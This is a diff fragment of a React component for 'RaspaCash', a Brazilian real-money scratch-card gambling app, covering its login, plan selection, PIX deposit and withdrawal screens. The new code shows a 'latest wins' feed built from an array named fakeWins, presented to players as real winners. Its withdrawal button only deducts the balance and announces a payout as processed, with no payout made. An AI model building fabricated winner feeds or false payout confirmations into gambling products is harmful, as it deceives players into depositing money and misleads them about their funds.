+            <p className="text-cyan-300">Entre para começar a raspar e ganhar!</p>
           </div>
           
-          <form onSubmit={handleLogin} className="space-y-4">
-            <div>
-              <label className="block text-sm font-bold mb-2">Nome Completo</label>
-              <input
-                name="name"
-                type="text"
-                required
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
-                placeholder="Seu nome completo"
-              />
-            </div>
-            <div>
-              <label className="block text-sm font-bold mb-2">Email</label>
-              <input
-                name="email"
-                type="email"
-                required
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
-                placeholder="seu@email.com"
-              />
-            </div>
+          <div className="space-y-4">
+            <input
+              type="text"
+              placeholder="Seu nome completo"
+              onChange={(e) => setUser(prev => ({ ...prev, name: e.target.value }))}
+              className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cyan-400"
+              required
+            />
+            <input
+              type="email"
+              placeholder="Seu e-mail"
+              onChange={(e) => setUser(prev => ({ ...prev, email: e.target.value }))}
+              className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-cyan-400"
+              required
+            />
             <button
-              type="submit"
-              className="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-green-300"
+              onClick={() => handleLogin(user.name, user.email)}
+              disabled={!user.name || !user.email}
+              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 disabled:from-gray-600 disabled:to-gray-700 text-white font-bold py-3 rounded-lg transition-all duration-300 transform hover:scale-105 disabled:hover:scale-100"
             >
-              ✨ Entrar na Plataforma ✨
+              🎲 Entrar e Jogar
             </button>
-          </form>
-
-          <div className="mt-4">
-            <div className="text-center text-sm mb-3 opacity-75">
-              <p>— OU —</p>
-            </div>
-
           </div>
           
-          <div className="mt-6 text-center text-sm opacity-75">
-            <p>Ao fazer login, você concorda com nossos termos de uso</p>
+          <div className="mt-6 text-center text-sm text-gray-400">
+            <p>Ao entrar, você concorda com nossos termos de uso</p>
           </div>
         </div>
       </div>
     );
   }
 
-  // Modal de saque
-  if (showWithdraw) {
-    return (
-      <div className="w-full h-full bg-gradient-to-br from-purple-600 via-pink-600 to-red-600 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
-        {/* Efeitos de fundo */}
-        <div className="absolute inset-0 opacity-30">
-          <div className="absolute top-20 left-20 w-40 h-40 bg-yellow-400 rounded-full blur-2xl animate-pulse"></div>
-          <div className="absolute bottom-20 right-20 w-32 h-32 bg-green-400 rounded-full blur-2xl animate-bounce"></div>
-        </div>
-        <div className="bg-gradient-to-br from-gray-900/90 to-purple-900/90 backdrop-blur-lg rounded-2xl p-4 sm:p-8 max-w-md w-full mx-auto my-4 border border-purple-400/50 shadow-2xl relative z-10">
-          <div className="text-center mb-4 sm:mb-6">
-            <h2 className="text-2xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
-              💸 Solicitar Saque 💸
-            </h2>
-            <p className="text-base sm:text-lg text-yellow-300">Saque via PIX - Rápido e Seguro</p>
-            <div className="flex justify-center space-x-2 mt-2">
-              <span className="text-lg sm:text-xl animate-bounce">💰</span>
-              <span className="text-lg sm:text-xl animate-pulse">📱</span>
-              <span className="text-lg sm:text-xl animate-bounce">⚡</span>
-            </div>
-          </div>
-
-          {/* Aviso de saque mínimo */}
-          <div className="bg-yellow-500/20 border border-yellow-400/50 rounded-lg p-4 mb-4">
-            <div className="text-center">
-              <div className="text-lg font-bold text-yellow-300 mb-1">
-                ⚠️ SAQUE MÍNIMO ⚠️
-              </div>
-              <div className="text-base text-yellow-200">
-                R$ 100,00
-              </div>
-              <div className="text-sm text-yellow-300 mt-1">
-                Processamento em até 24 horas
-              </div>
-            </div>
-          </div>
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-blue-900 text-white">
+      {/* Header */}
+      <header className="bg-gradient-to-r from-purple-900/80 via-blue-900/80 to-cyan-900/80 backdrop-blur-lg border-b border-cyan-400/30 shadow-lg">
+        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
+          <h1 className="text-2xl font-bold bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
+            RaspaCash
+          </h1>
           
-          <form onSubmit={handleWithdraw} className="space-y-4">
-            <div>
-              <label className="block text-sm font-bold mb-2">Valor do Saque</label>
+          <div className="flex items-center space-x-4">
+            <div className="text-right">
+              <div className="text-sm text-cyan-300">Saldo</div>
+              <div className="text-xl font-bold text-green-400">R$ {balance.toFixed(2)}</div>
+            </div>
+            
+            <button
+              onClick={() => setShowDeposit(true)}
+              className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-2 px-4 rounded-lg transition-all duration-300"
+            >
+              💰 Depositar
+            </button>
+            
+            <button
+              onClick={() => setShowWithdraw(true)}
+              className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-lg transition-all duration-300"
+            >
+              💸 Sacar
+            </button>
+            
+            <button
+              onClick={() => setShowFeed(true)}
+              className="bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-yellow-600 hover:to-yellow-700 text-white font-bold py-2 px-4 rounded-lg transition-all duration-300"
+            >
+              🏆 Ganhos
+            </button>
+          </div>
+        </div>
+      </header>
+
+      <main className="container mx-auto px-4 py-8">
+        {selectedPlan ? (
+          <div className="max-w-2xl mx-auto text-center">
+            <h2 className="text-2xl font-bold text-yellow-300 mb-4">Jogo Concluído!</h2>
+            <button
+              onClick={() => setSelectedPlan(null)}
+              className="bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-lg transform hover:scale-105 transition-all duration-200"
+            >
+              🎲 Jogar Novamente
+            </button>
+          </div>
+        ) : (
+          <div className="space-y-8">
+            <div className="text-center mb-8">
+              <h2 className="text-3xl font-bold text-yellow-300 mb-2">Escolha seu Plano</h2>
+              <p className="text-cyan-300">Selecione o plano ideal para você!</p>
+            </div>
+            
+            <div className="grid md:grid-cols-3 gap-6">
+              {plans.map(plan => (
+                <div key={plan.id} className={`bg-gradient-to-br ${plan.color} p-1 rounded-xl shadow-lg transform hover:scale-105 transition-all duration-300`}>
+                  <div className="bg-gray-900/90 rounded-lg p-6 h-full">
+                    <h3 className="text-xl font-bold text-yellow-300 mb-2">{plan.name}</h3>
+                    <p className="text-gray-300 text-sm mb-4">{plan.description}</p>
+                    
+                    <div className="space-y-2 mb-4">
+                      <div className="flex justify-between">
+                        <span className="text-cyan-300">Custo:</span>
+                        <span className="text-white font-bold">R$ {plan.cost}</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-cyan-300">Prêmio máximo:</span>
+                        <span className="text-green-400 font-bold">R$ {plan.maxPrize}</span>
+                      </div>
+                    </div>
+                    
+                    <button
+                      onClick={() => buyCard(plan.id)}
+                      className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white font-bold py-3 rounded-lg transition-all duration-300"
+                    >
+                      🎲 Jogar Agora
+                    </button>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+      </main>
+
+      {/* Modais */}
+      {showDeposit && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
+          <div className="bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 rounded-xl p-6 max-w-md w-full border border-cyan-400/30">
+            <h3 className="text-xl font-bold text-yellow-300 mb-4">💰 Depósito via PIX</h3>
+            
+            <div className="space-y-4">
               <input
                 type="number"
+                placeholder="Valor (mínimo R$ 10)"
+                value={depositAmount}
+                onChange={(e) => setDepositAmount(e.target.value)}
+                className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white"
+                min="10"
+              />
+              
+              <div className="text-center">
+                <p className="text-cyan-300 mb-2">PIX Copia e Cola:</p>
+                <div className="bg-gray-800 p-3 rounded-lg font-mono text-sm text-green-400 break-all">
+                  00020126580014br.gov.bcb.pix01364adb8d4e-8b5c-4d5f-9e2f-1234567890ab5204000053039865802BR5925RASPACASH LTDA6009SAO PAULO62140510RPX{depositAmount}6304ABCD
+                </div>
+              </div>
+              
+              <div className="flex space-x-3">
+                <button
+                  onClick={() => {
+                    if (depositAmount >= 10) {
+                      setBalance(prev => prev + parseFloat(depositAmount));
+                      setDepositAmount('');
+                      setShowDeposit(false);
+                      alert(`Depósito de R$ ${depositAmount} confirmado!`);
+                    }
+                  }}
+                  className="flex-1 bg-gradient-to-r from-green-500 to-green-600 text-white font-bold py-3 rounded-lg"
+                >
+                  ✅ Confirmar
+                </button>
+                <button
+                  onClick={() => setShowDeposit(false)}
+                  className="flex-1 bg-gray-600 text-white font-bold py-3 rounded-lg"
+                >
+                  Cancelar
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showFeed && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
+          <div className="bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 rounded-xl p-6 max-w-md w-full border border-cyan-400/30">
+            <h3 className="text-xl font-bold text-yellow-300 mb-4">🏆 Últimos Ganhos</h3>
+            
+            <div className="space-y-3 max-h-64 overflow-y-auto">
+              {fakeWins.map((win, index) => (
+                <div key={index} className="bg-gray-800/50 rounded-lg p-3 border border-green-400/30">
+                  <div className="flex justify-between items-center">
+                    <div>
+                      <div className="text-white font-bold">{win.name}</div>
+                      <div className="text-cyan-300 text-sm">{win.plan}</div>
+                    </div>
+                    <div className="text-right">
+                      <div className="text-green-400 font-bold">R$ {win.prize}</div>
+                      <div className="text-gray-400 text-xs">{win.time}</div>
+                    </div>
+                  </div>
+                </div>
+              ))}
+            </div>
+            
+            <button
+              onClick={() => setShowFeed(false)}
+              className="w-full mt-4 bg-gray-600 text-white font-bold py-3 rounded-lg"
+            >
+              Fechar
+            </button>
+          </div>
+        </div>
+      )}
+
+      {showWithdraw && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
+          <div className="bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 rounded-xl p-6 max-w-md w-full border border-cyan-400/30">
+            <h3 className="text-xl font-bold text-yellow-300 mb-4">💸 Saque via PIX</h3>
+            
+            <div className="space-y-4">
+              <input
+                type="number"
+                placeholder="Valor do saque"
                 value={withdrawAmount}
                 onChange={(e) => setWithdrawAmount(e.target.value)}
-                min="100"
+                className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white"
                 max={balance}
-                step="0.01"
-                required
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
-                placeholder="R$ 100,00 (mínimo)"
               />
-              <div className="text-xs text-yellow-300 mt-1">
-                💰 Saldo disponível: R$ {balance.toFixed(2)}
-              </div>
-            </div>
-
-            <div>
-              <label className="block text-sm font-bold mb-2">Nome Completo</label>
+              
               <input
                 type="text"
+                placeholder="Nome completo"
                 value={withdrawData.fullName}
                 onChange={(e) => setWithdrawData(prev => ({ ...prev, fullName: e.target.value }))}
-                required
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
-                placeholder="Seu nome completo como no CPF"
+                className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white"
               />
-              <div className="text-xs text-yellow-300 mt-1">
-                👤 Nome igual ao documento de identidade
-              </div>
-            </div>
-
-            <div>
-              <label className="block text-sm font-bold mb-2">Tipo de Chave PIX</label>
+              
               <select
                 value={withdrawData.pixKeyType}
                 onChange={(e) => setWithdrawData(prev => ({ ...prev, pixKeyType: e.target.value }))}
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white"
+                className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white"
               >
-                <option value="cpf" className="bg-gray-800">CPF</option>
-                <option value="email" className="bg-gray-800">E-mail</option>
-                <option value="telefone" className="bg-gray-800">Telefone</option>
-                <option value="aleatoria" className="bg-gray-800">Chave Aleatória</option>
+                <option value="cpf">CPF</option>
+                <option value="email">E-mail</option>
+                <option value="phone">Telefone</option>
+                <option value="random">Chave Aleatória</option>
               </select>
-            </div>
-
-            <div>
-              <label className="block text-sm font-bold mb-2">Chave PIX</label>
+              
               <input
                 type="text"
+                placeholder="Chave PIX"
                 value={withdrawData.pixKey}
                 onChange={(e) => setWithdrawData(prev => ({ ...prev, pixKey: e.target.value }))}
-                required
-                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
-                placeholder={
-                  withdrawData.pixKeyType === 'cpf' ? '000.000.000-00' :
-                  withdrawData.pixKeyType === 'email' ? 'seu@email.com' :
-                  withdrawData.pixKeyType === 'telefone' ? '(11) 99999-9999' :
-                  'Chave aleatória do PIX'
-                }
+                className="w-full p-3 bg-gray-800 border border-cyan-400/30 rounded-lg text-white"
               />
-              <div className="text-xs text-yellow-300 mt-1">
-                🔑 {
-                  withdrawData.pixKeyType === 'cpf' ? 'Digite seu CPF (com ou sem pontos)' :
-                  withdrawData.pixKeyType === 'email' ? 'E-mail cadastrado no seu banco' :
-                  withdrawData.pixKeyType === 'telefone' ? 'Telefone cadastrado no PIX' :
-                  'Chave aleatória gerada pelo seu banco'
-                }
+              
+              <div className="flex space-x-3">
+                <button
+                  onClick={() => {
+                    if (withdrawAmount <= balance && withdrawAmount >= 20) {
+                      setBalance(prev => prev - parseFloat(withdrawAmount));
+                      setWithdrawAmount('');
+                      setWithdrawData({ fullName: '', pixKey: '', pixKeyType: 'cpf' });
+                      setShowWithdraw(false);
+                      alert(`Saque de R$ ${withdrawAmount} processado! Aguarde até 24h úteis.`);
+                    } else {
+                      alert('Valor inválido ou saldo insuficiente!');
+                    }
+                  }}
+                  className="flex-1 bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-3 rounded-lg"
+                >
+                  💸 Sacar
+                </button>
+                <button
+                  onClick={() => setShowWithdraw(false)}
+                  className="flex-1 bg-gray-600 text-white font-bold py-3 rounded-lg"
+                >
+                  Cancelar
+                </button>
               </div>
             </div>
-            
-            <div>
-              <label className="block text-sm font-bold mb-2">Método de Pagamento</label>
-              <div className="flex justify-center">
-                <div className="p-4 rounded-lg border-2 border-purple-400 bg-gradient-to-br from-purple-400/30 to-pink-400/30 shadow-lg shadow-purple-400/20 w-48">
-                  <div className="text-center">
-                    <div className="text-3xl mb-2">📱</div>
-                    <div className="text-lg font-bold text-purple-200">PIX</div>
-                    <div className="text-sm text-purple-300 mt-1">Único método disponível</div>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <button
-              type="submit"
-              disabled={
-                isProcessingPayment ||
-                !withdrawAmount || 
-                parseFloat(withdrawAmount) < 100 || 
-                parseFloat(withdrawAmount) > balance ||
-                !withdrawData.fullName.trim() ||
-                !withdrawData.pixKey.trim()
-              }
-              className={`w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 ${
-                isProcessingPayment
-                  ? 'bg-gray-500 cursor-not-allowed border-gray-400'
-                  : withdrawAmount && 
-                    parseFloat(withdrawAmount) >= 100 && 
-                    parseFloat(withdrawAmount) <= balance &&
-                    withdrawData.fullName.trim() &&
-                    withdrawData.pixKey.trim()
-                    ? 'bg-gradient-to-r from-purple-500 via-pink-500 to-red-500 hover:from-purple-600 hover:via-pink-600 hover:to-red-600 text-white border-purple-300'
-                    : 'bg-gradient-to-r from-gray-500 to-gray-600 text-gray-300 cursor-not-allowed border-gray-400'
-              }`}
-            >
-              {isProcessingPayment
-                ? '⏳ Processando Saque...'
-                : !withdrawAmount || parseFloat(withdrawAmount) < 100 
-                ? '💸 Saque Mínimo R$ 100' 
-                : parseFloat(withdrawAmount) > balance 
-                ? '💸 Saldo Insuficiente'
-                : !withdrawData.fullName.trim() || !withdrawData.pixKey.trim()
-                ? '📝 Preencha todos os dados'
-                : `💸 Sacar R$ ${parseFloat(withdrawAmount).toFixed(2)} via PIX`
-              }
-            </button>
-          </form>
-          
-          <button
-            onClick={() => {
-              setShowWithdraw(false);
-              setWithdrawAmount('');
-              setWithdrawData({ fullName: '', pixKey: '', pixKeyType: 'cpf' });
-            }}
-            className="w-full mt-4 bg-gray-600 hover:bg-gray-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-gray-400"
-          >
-            Cancelar
-          </button>
+          </div>
         </div>
-      </div>
-    );
-  }
-
-  // Continue with rest of modals and main game interface...
-  // (Rest of the code from your original component - I'll continue in next part)
-
-  return (
-    <div className="w-full h-full bg-gradient-to-br from-red-500 via-purple-600 via-blue-600 to-green-500 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
-      <div className="text-center">
-        <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
-          🎰 RaspaCash Sistema Completo 🎰
-        </h1>
-        <p className="text-lg text-yellow-200">Sistema em desenvolvimento...</p>
-      </div>
+      )}
     </div>
   );
-};
-
-export default SistemaRaspadinha;
+}
